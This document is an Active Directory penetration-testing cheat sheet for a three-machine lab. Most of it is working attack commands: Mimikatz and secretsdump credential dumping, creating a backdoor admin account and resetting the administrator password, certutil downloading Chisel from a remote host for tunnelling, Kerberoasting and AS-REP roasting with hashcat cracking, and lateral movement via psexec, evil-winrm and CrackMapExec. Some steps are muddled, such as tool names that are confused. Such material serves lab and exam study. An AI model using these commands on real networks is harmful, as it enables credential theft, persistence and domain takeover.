# Active Directory General Methodology

Active Directory is challenging for everyone, With the provided credentials, simply run an Nmap scan to enumerate services and open ports. Use the scan results to determine where to apply the credentials effectively based on the identified services. there are three different machines: Machine01, Machine02, Domain01. The Machine01 machine always begins with initial access and privilege escalation as a standalone. Please use the following steps to work on Active Directory:

1. Run net user /domain.
2. List users and run sharpHound.ps1 to find domain users (otherwise not in user list) and also with the steps below.
3. Run secretdumps, and if you come from a reverse shell, then change the administrator password.
4. For tunneling (use Chisel or run with SSH), if there is an issue, revert the machine.
5. Find user and password from secretdumps, mimikatz c drive, config files, winpeas, etc.
6. Check services with open ports such as 22, 1433, 5896, 5895, 445, etc.
7. Use CrackMapExec with user and password, testing with the above services.
8. Perform AS-REP Roasting with GetUserSPN.py or Rubeus.exe.
9. If SQL, use mssqlclient.py; if SMB, use psexec.py; if WinRM or evil-winrm, check the administrator, then move to the next step to find the Windows root.
10. For Domain01:
11. Run secretsdump (Default administrator) with user pass or hash, same with psexec, winrm, SSH, etc.
12. Directly rooted."

## Machine01

After get privilege escalation then run following commands
· Transfer SharpHound.ps1 to target & load in powershell ::

    · . . \SharpHound.ps1

    · Invoke-BloodHound -CollectionMethod All

· Found users account domain01 (if you find user then don’t use below step)

· transfer bloodhound.zip on kali

· Create a new user (if you want or change administrator password)

    · net user noman Noman@321 /add

    · net localgroup administrators noman /add

    · net user administrator Noman@123 (password Changed of administrator)

· run secret dump or use mimikatz to find user and password on machine01

· use impacket for secret dump https://github.com/fortra/impacket

    · python3 ./secretsdump.py ./administrator: Noman@123@192.168.10.10 (check domain users with noman.domain specially default username and password

· for MimiKatz 

    privilege::debug | token::elevate | sekurlsa::logonpasswords

## Machine02

The first step is to start port forwarding, followed by running AS-REP Roasting with
GetUserSPNs.py for Linux and Rubeus.exe for Windows. If neither method works, manually
enumerate in Windows to find the username and password or again use mimikatz. If you are
not an administrator, apply Windows privilege escalation techniques on it. This will help you
gain privileges on Machine02.
· run map on Machine02 with 

    proxychains nmap -sT -sU -p22,161,135,139,445,88,3389 10.10.10.10

Port Forward with SSH (if port 22 is open in machine01)

    · ssh -D 8001 -C -q -N noman@192.168.10.10

in /etc/proxychains4.conf (add 127.0.0.1 9999)

    · socks5 127.0.0.1 8001

Port Forward with chisel

· socks5 127.0.0.1 1080 add this in /etc/proxychains

    · ./chisel server -p 5555 --reverse

    · certutil -urlcache -split -f http://192.168.100.100/chisel-x64.exe

    · chisel client 192.168.100.100:5555 R:socks

## Windows Kerberoasting with Windows Machine02

    · .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

    · sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule –force

OR

Get-UserSPNs.py

· make user firewall if off and you are local admin etc)

    proxychains python3 impacket-GetNPUsers noman.domain/noman:Noman@123 -dc-ip 10.10.100.100

    sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule –force

If SQL, use mssqlclient.py; if SMB, use psexec.py; if WinRM or evil-winrm, check the
administrator, then move to the next step to find the Windows root. If you find a lot of
username and password then use crackmapexec for SMB, SQL, WinRm or evil-winrm

## Domain01

· run nmap on Domain01 with 

    proxychains nmap -sT -sU -p22,161,445,88,3389 10.10.10.10

· check nmap for login and use crackmapexec. If you don’t want to use nmap then

· simply login with psexec,winrm or winexe

· if you cant find the username and password then use different method like pass the hash, silver ticket
